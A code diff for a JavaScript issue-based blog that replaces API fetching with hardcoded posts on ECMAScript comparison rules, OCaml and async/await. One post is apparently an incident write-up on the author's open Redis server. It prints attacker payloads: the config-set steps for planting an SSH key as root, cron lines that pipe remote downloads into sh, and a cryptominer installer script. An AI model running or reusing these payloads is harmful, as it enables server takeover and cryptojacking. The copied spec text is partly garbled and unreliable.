@@ -1,75 +1,15 @@
-import 'whatwg-fetch'
-import Storage from './storage'
-import { owner, repo } from './const'
 
-const FETCH_ALL_TIME = 'FETCH_ALL_TIME';
-
-// cache expires after 1h, if cache available, not request remote
+let posts = [{"title":"The Comparison in Javascript","state":"open","number":6,"body":"## SameValue(x,y)\r\n\r\nThe internal comparison abstract operation SameValue(x, y), where x and y are ECMAScript language values, produces true\r\nor false. Such a comparison is performed as follows:\r\n1. If Type(x) is different from Type(y), return false.\r\n2. If Type(x) is Number, then\r\na. If x is NaN and y is NaN, return true.\r\nb. If x is +0 and y is ‑0, return false.\r\nc. If x is ‑0 and y is +0, return false.\r\nd. If x is the same Number value as y, return true.\r\ne. Return false.\r\n3. Return SameValueNonNumber(x, y).\r\n<!--more-->\r\n## SameValueZero(x,y)\r\n\r\nThe internal comparison abstract operation SameValueZero(x, y), where x and y are ECMAScript language values, produces\r\ntrue or false. Such a comparison is performed as follows:\r\n1. If Type(x) is different from Type(y), return false.\r\n2. If Type(x) is Number, then\r\na. If x is NaN and y is NaN, return true.\r\nb. If x is +0 and y is ‑0, return true.\r\nc. If x is ‑0 and y is +0, return true.\r\n7.2.6 IsInteger ( argument )\r\n7.2.7 IsPropertyKey ( argument )\r\n7.2.8 IsRegExp ( argument )\r\n7.2.9 SameValue (x, y)\r\n7.2.10 SameValueZero (x, y)\r\nNOTE\r\nd. If x is the same Number value as y, return true.\r\ne. Return false.\r\n3. Return SameValueNonNumber(x, y).\r\n\r\n## SameValueNonNumber (x, y)\r\n\r\nThe internal comparison abstract operation SameValueNonNumber(x, y), where neither x nor y are Number values, produces\r\ntrue or false. Such a comparison is performed as follows:\r\n1. Assert: Type(x) is not Number.\r\n2. Assert: Type(x) is the same as Type(y).\r\n3. If Type(x) is Undefined, return true.\r\n4. If Type(x) is Null, return true.\r\n5. If Type(x) is String, then\r\na. If x and y are exactly the same sequence of code units (same length and same code units at corresponding indices),\r\nreturn true; otherwise, return false.\r\n6. If Type(x) is Boolean, then\r\na. If x and y are both true or both false, return true; otherwise, return false.\r\n7. If Type(x) is Symbol, then\r\na. If x and y are both the same Symbol value, return true; otherwise, return false.\r\n8. Return true if x and y are the same Object value. Otherwise, return false.\r\n\r\n## Abstract Relational Comparison\r\n\r\nThe comparison x < y, where x and y are values, produces true, false, or undefined (which indicates that at least one\r\noperand is NaN). In addition to x and y the algorithm takes a Boolean flag named LeftFirst as a parameter. The flag is used to\r\ncontrol the order in which operations with potentially visible side‑effects are performed upon x and y. It is necessary because\r\nECMAScript specifies left to right evaluation of expressions. The default value of LeftFirst is true and indicates that the x\r\nparameter corresponds to an expression that occurs to the left of the y parameter's corresponding expression. If LeftFirst is\r\nfalse, the reverse is the case and operations must be performed upon y before x. Such a comparison is performed as follows:\r\n1. If the LeftFirst flag is true, then\r\na. Let px be ? ToPrimitive(x, hint Number).\r\nb. Let py be ? ToPrimitive(y, hint Number).\r\n2. Else the order of evaluation needs to be reversed to preserve left to right evaluation\r\na. Let py be ? ToPrimitive(y, hint Number).\r\nb. Let px be ? ToPrimitive(x, hint Number).\r\n3. If both px and py are Strings, then\r\na. If py is a prefix of px, return false. (A String value p is a prefix of String value q if q can be the result of\r\nconcatenating p and some other String r. Note that any String is a prefix of itself, because r may be the empty\r\nString.)\r\nb. If px is a prefix of py, return true.\r\nc. Let k be the smallest nonnegative integer such that the code unit at index k within px is different from the code unit\r\nat index k within py. (There must be such a k, for neither String is a prefix of the other.)\r\nd. Let m be the integer that is the code unit value at index k within px.\r\ne. Let n be the integer that is the code unit value at index k within py.\r\nf. If m < n, return true. Otherwise, return false.\r\n4. Else,\r\na. Let nx be ? ToNumber(px). Because px and py are primitive values evaluation order is not important.\r\nb. Let ny be ? ToNumber(py).\r\nc. If nx is NaN, return undefined.\r\nd. If ny is NaN, return undefined.\r\ne. If nx and ny are the same Number value, return false.\r\nf. If nx is +0 and ny is ‑0, return false.\r\n7.2.11 SameValueNonNumber (x, y)\r\n7.2.12 Abstract Relational Comparison\r\nNOTE 1\r\nNOTE 2\r\nNOTE\r\ng. If nx is ‑0 and ny is +0, return false.\r\nh. If nx is +∞, return false.\r\ni. If ny is +∞, return true.\r\nj. If ny is ‑∞, return false.\r\nk. If nx is ‑∞, return true.\r\nl. If the mathematical value of nx is less than the mathematical value of ny —note that these mathematical values are\r\nboth finite and not both zero—return true. Otherwise, return false.\r\n\r\n## Abstract Equality Comparison\r\n\r\nThe comparison x == y, where x and y are values, produces true or false. Such a comparison is performed as follows:\r\n1. If Type(x) is the same as Type(y), then\r\na. Return the result of performing Strict Equality Comparison x === y.\r\n2. If x is null and y is undeᲪined, return true.\r\n3. If x is undeᲪined and y is null, return true.\r\n4. If Type(x) is Number and Type(y) is String, return the result of the comparison x == ToNumber(y).\r\n5. If Type(x) is String and Type(y) is Number, return the result of the comparison ToNumber(x) == y.\r\n6. If Type(x) is Boolean, return the result of the comparison ToNumber(x) == y.\r\n7. If Type(y) is Boolean, return the result of the comparison x == ToNumber(y).\r\n8. If Type(x) is either String, Number, or Symbol and Type(y) is Object, return the result of the comparison x ==\r\nToPrimitive(y).\r\n9. If Type(x) is Object and Type(y) is either String, Number, or Symbol, return the result of the comparison ToPrimitive(x)\r\n== y.\r\n10. Return false.\r\n\r\n\r\n## Strict Equality Comparison\r\n\r\nThe comparison x === y, where x and y are values, produces true or false. Such a comparison is performed as follows:\r\n1. If Type(x) is different from Type(y), return false.\r\n2. If Type(x) is Number, then\r\na. If x is NaN, return false.\r\nb. If y is NaN, return false.\r\nc. If x is the same Number value as y, return true.\r\nd. If x is +0 and y is ‑0, return true.\r\ne. If x is ‑0 and y is +0, return true.\r\nf. Return false.\r\n3. Return SameValueNonNumber(x, y).\r\n","date":"2017-01-03T07:57:44Z","tags":[{"name":"JavaScript","color":"f1e05a"}]},{"title":"感觉OCaml是个挺有趣的语言","state":"open","number":5,"body":"既不像 haskell 那样刻意的去追求 Pure, 又不失 Functional, 顺便还带了类似于C++版的OO. 感觉 module 系统也很强大.\r\n\r\n不需要购买游标卡尺,又不会显得太乱QAQ\r\n\r\n既能编译到 bytecode, 又能编译到 native, 跑分也还不错(雾).\r\n\r\n总体来说除了用的人不太多,都挺不错的\r\n","date":"2017-01-01T18:32:28Z","tags":[{"name":"OCaml","color":"3be133"}]},{"title":"突然想到 Javascript 里的 async-await 和 Haskell 里的 do-notation 是一个东西","state":"open","number":4,"body":"Javascript 里面的 Promise 对应 Haskell 里的 Monad，把操作封装在 Promise/Monad 里。\r\n```javascript\r\nasync function do(){\r\n  let a = await JobOne();\r\n  let b = await JobTwo();\r\n  return c;\r\n}\r\n```\r\n```haskell\r\ndo' = do\r\n  a <- job_one\r\n  b <- job_two\r\n  return c\r\n```\r\n只不过没有haskell那些类型约束=-=","date":"2016-12-02T16:30:46Z","tags":[{"name":"Haskell","color":"29b544"},{"name":"JavaScript","color":"f1e05a"}]},{"title":"关于 Redis 安全的问题","state":"open","number":3,"body":"之前为了方便存一些数据，我在自己 vps 上开了一个公网可以访问的 redis 服务，没有设置密码。今天突然奇想，看了看上面有什么。结果看到了某些不太好的东西。\r\n\r\n```\r\n127.0.0.1:6379> keys *\r\n1) \"f17cc4f5e5\"\r\n2) \"crackit\"\r\n3) \"7cc4f5e5\"\r\n127.0.0.1:6379> \r\n```\r\n\r\n有 3 条数据，2 个乱码名字，先看看正常点的名字`crackit`:\r\n\r\n```\r\n127.0.0.1:6379> get crackit\r\n\"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/cGu3SeRUbTfPVGWZw9hRod+HWik+Ca8Mj0Flxwb2iU2MIOTRLyuB29ZwkgB4WpPEWD3NReSIo1cIYhuAKtVNGF6WgxnsAs++lcbkNGFDXPuhRHkPiiz11ipWtk7xUF3rkVGvbaBO4gNFGSmZ8fvJdqquXM/EtEySURswo1bT5uWsE0TU2Bolw0XbeIPe99Uuw9bTOYP3UvCw2abvOWsRmm5mZAl/mosgDq1NQux0XdO6oT9QTk2ID4pbza8AcTqGFE4rQcOxF/YCpPDwd4lRxmSWl8WmbAWRDolJLxQFuIMZt7sg+yvGj7Z6+ils7/qLvcZx6A5E21Ldcg3UXrKp root@niuoh\\n\\n\\n\\n\"\r\n127.0.0.1:6379> \r\n```\r\n\r\n吖咯，看到了某某人的 `ssh public key`呢。\r\n<!--more-->\r\n这是一种破解 redis 宿主机 ssh 权限的方法：\r\n\r\n1. 使用 config set dir /root/.ssh/ # 将 redis 目录设置为 /root/.ssh\r\n2. config set dbfilename \"authorized_keys\" # 将 redis 数据库文件设置为 authorized_keys\r\n3. set 上面的字符串，写于到 2 中的文件\r\n\r\n这样就把攻击者的公钥写到了 /root/.ssh 目录的 authorized_keys 文件，进而获得了 ssh 到 root的权限。有个问题是假如宿主机 root 用户没有 `.ssh` 目录时，这个方式会失败。(未实验)\r\n\r\n这个主机名让我查到了人哦。\r\n\r\n---\r\n\r\n看看下一个:\r\n\r\n```\r\n127.0.0.1:6379> get f17cc4f5e5\r\n\"\\n\\n*/1 * * * * curl http://104.223.133.27/1 | sh\\n\\n\"\r\n127.0.0.1:6379> \r\n```\r\n\r\n从前面的 `*/1 * * * * ` 来看应该是 `cron job`，这个其实和上面差不多，还是利用了` config set dir|dbfilename` 将内容写入到了`/var/spool/cron/root`文件，这样在定时任务执行时就能做各种shell里能做的事情了。\r\n可惜这个 IP 也不能访问，whois 也查不出个所以然。\r\n\r\n---\r\n\r\n最后一个\r\n\r\n```\r\n127.0.0.1:6379> get 7cc4f5e5\r\n\"\\n\\n*/1 * * * * curl https://cdn.rawgit.com/hextrip/hextripgo/master/install | sh;\\n\\n\"\r\n127.0.0.1:6379> \r\n```\r\n\r\n这个和上一个是同一个套路，不过这个能直接看到 `shellcode` 的内容:\r\n```\r\n#!/bin/sh\r\nps -fe|grep syslogdaemon |grep -v grep\r\nif [ $? -ne 0 ]\r\nthen\r\nnohup /tmp/syslogdaemon -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 49hNrEaSKAx5FD8PE49Wa3DqCRp2ELYg8dSuqsiyLdzSehFfyvk4gDfSjTrPtGapqcfPVvMtAirgDJYMvbRJipaeTbzPQu4 -p x &\r\nif [ ! -f /tmp/syslogdaemon ]\r\nthen\r\ncurl https://ooo.0o0.ooo/2016/11/27/583a97938c4f9.png|dd of=/tmp/syslogdaemon skip=7664 bs=1;chmod +x /tmp/syslogdaemon\r\nnohup /tmp/syslogdaemon -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 49hNrEaSKAx5FD8PE49Wa3DqCRp2ELYg8dSuqsiyLdzSehFfyvk4gDfSjTrPtGapqcfPVvMtAirgDJYMvbRJipaeTbzPQu4 -p x &\r\nfi\r\nelse\r\necho \"runing.....\"\r\nfi\r\n```\r\n\r\n哎呀，中间那个ooo.0o0.ooo好眼熟啊，好像是 v2ex 上某个绿头像的人的站？这个人煞费心机把 ELF 接到 png 后面也是看得我一脸茫然，这是为了不暴露自己么，orz...\r\n\r\n虽然说脚本的内容各不相同，但是利用的漏洞都是同一个。哎，我早早地就已经把 `config` 命令禁用了...\r\n\r\n```\r\nrename-command CONFIG \"\"\r\nrename-command FLUSHALL \"\"\r\nrename-command FLUSHDB \"\"\r\nrename-command EVAL \"\"\r\n```\r\n\r\n也不知道 redis 还有木有其他不安全的地方=-=，没装 cronie , 不用 /root/.ssh 目录不知道会不会安全点。","date":"2016-11-22T18:01:51Z","tags":[{"name":"Linux","color":"c2e0c6"}]},{"title":"1479658124246","state":"closed","number":2,"body":"1479658124246","date":"2016-11-20T16:08:49Z","tags":[]},{"title":"终结是新的开始","state":"open","number":1,"body":"之前考虑着关掉博客，但是想了一想还是不想把就这么关掉，大概是从去年的7、8月份时写了第一篇，好像是关于 `IOC/AOP` 的吧，之后基本上几天能写一篇，不过内容都不算很多，不是很详细，也不是很深入的那种，大多都是写一些自己的小玩具之类的。\r\n\r\n暑假之后更新的次数少了很多，原因前面已经说过了。本来想着关掉博客这个博客，后来还是没有舍得下手。但是就那样继续下去又感觉略别扭。其实蛮想不到的，自己这些文章里好像只有那个写多说评论框`https`下使用的文章稍热一点点。好吧，现在其实不需要那么麻烦了，只需要在 `http header` 里带上 `Content-Security-Policy: upgrade-insecure-requests` 把那些 `http` 连接**强行**升为 `https` 就好了。\r\n<!--more-->\r\n终结是新的开始。我把之前的东西全部都备份压缩放到了 `github` 上「怎么感觉这好像算是滥用的样子」，木有续以前的坑。\r\n\r\n重新写了博客，考虑到未来可能不想续费阿里云了(有点贵)，所以考虑以后部署到 `github pages`。\r\n大部分人都是用的 `hexo`,`jekyll` 等静态博客生成工具。将博客内容写到 `markdown` 文件里，然后 `build` 出博客的静态文件，再 `push` 到 `username.github.io` 或 `gh-pages` 分支上。但是呢，我可不想落入俗套呐，于是我就结合了 @Junnplus 这家伙的「見 issues」 ，用 `SPA + github commit api` 实现了这个博客咯。哎，之前百度还收录了我100多个页面呢，换上 `SPA` 后估计就没了，无所谓了=-=\r\n\r\n因为真正自己写的部分只有前端的部分，所以我考录着「能不能只使用CDN来部署呢？」，因为腾讯云免费提供一定量的CDN流量，所以我就想到了部署到腾讯云的CDN，腾讯云的CDN支持回源/ftp上传空间/oss三种部署的方式，因为 oss 有现成的 sdk 的原因，所以我选择了用 oss 储存的方式（后来才发现这是个深坑，不能直接上传一个目录，只能一个一个传）。\r\n\r\n写完了自动部署的脚本，下一个问题就是自动构建了，其实这个问题网上已经有现成的解决方案了，有各种 CI(持续集成) 工具来做这件事，但是因为有些需要收费的原因，我不是很想去学。so, 自己写一个咯，这个倒是很简单，因为是 webhook 的机制，所以需要一个 web server 来 hook events，这时候就用上了以前注册的好东西了，用上了 `arukas.io` 的 `docker` 云，开一个 `containner` 轻松愉快。每当新 push 时，脚本都会自动构建一次并将过程表现在<https://github.com/lingmm/IssueBlog/commits/master>上面。\r\n\r\n不得不说，`python` 的 `cotextmanager` 做这个蛮好用的。\r\n```python\r\n@contextlib.contextmanager\r\ndef status_around():\r\n  status('pending')\r\n  try:\r\n    yield\r\n    status('success')\r\n  except:\r\n    status('error')\r\n\r\nwith status_around():\r\n  build()\r\n```\r\n当然像 `ruby`,`scala` 能做的比↑还要好看一点，不过 `python` 也还不错啦~\r\n\r\n今天试了试 `daocloud` ，以前都是用命令操作  `docker` ，换成 `UI` 感觉体验蛮不错的，除了那个有点像 `icloud` 的 `mainmenu` ，其他体验都挺好，中间我通过微信问了问他们怎么删除他们的 `monitor`，解释的也挺热情的。(感觉他们的monitor有点占内存)\r\n\r\n建了个 images 放了博客，目前放在 `daocloud` 上管理，感觉美滋滋，QAQ","date":"2016-11-12T14:56:03Z","tags":[{"name":"Blog","color":"e99695"}]}];
 export const Post = {
-  perfix: 'https://api.github.com',
-  timeout: 60 * 60 * 1000,
-
-  async get(number) {
-    let post = Storage.get(number);
-    if (post && (Date.now() <= (post.fetch_time + Post.timeout))) {
-      return post;
-    } else {
-      let res = await fetch(`${Post.perfix}/repos/${owner}/${repo}/issues/${number}`, {
-        cors: 'include'
-      });
-      let data = await res.json();
-
-      let post = {
-        title: data.title,
-        date: data.created_at,
-        body: data.body,
-        state: data.state,
-        number: data.number,
-        tags: data.labels.map(label => {
-          return {
-            name: label.name,
-            color: label.color
-          };
-        }),
-        fetch_time: Date.now()
-      };
-      Storage.set(post.number, post);
-      return Post.get(number);
+    async get(no) {
+        let post =  posts.find(post=>post.number == no);
+        if(post){
+            return post;
+        }else{
+            throw new Error('Post not found');
+        }
+    },
+    async all() {
+        return posts;
     }
-  },
-  async all() {
-    let time = Storage.get(FETCH_ALL_TIME) || 0;
-    if (Date.now() <= (time + Post.timeout)) {
-      return Storage.keys().sort((a, b) => b - a).map(Storage.get);
-    } else {
-      let res = await fetch(`${Post.perfix}/repos/${owner}/${repo}/issues?filter=created&state=all`, {
-        cors: 'include'
-      });
-
-      Storage.keys().map(Storage.delete); //delete all
-
-      let data = await res.json();
-      data.filter(single => {
-        return single.state !== 'closed';
-      }).forEach(single => {
-        let data = {
-          title: single.title,
-          state: single.state,
-          number: single.number,
-          body: single.body,
-          date: single.created_at,
-          tags: single.labels.map(label => {
-            return {
-              name: label.name,
-              color: label.color
-            };
-          }),
-          fetch_time: Date.now()
-        };
-        Storage.set(data.number, data);
-      });
-      Storage.set(FETCH_ALL_TIME, Date.now());
-      return Post.all();
-    }
-  }
 }
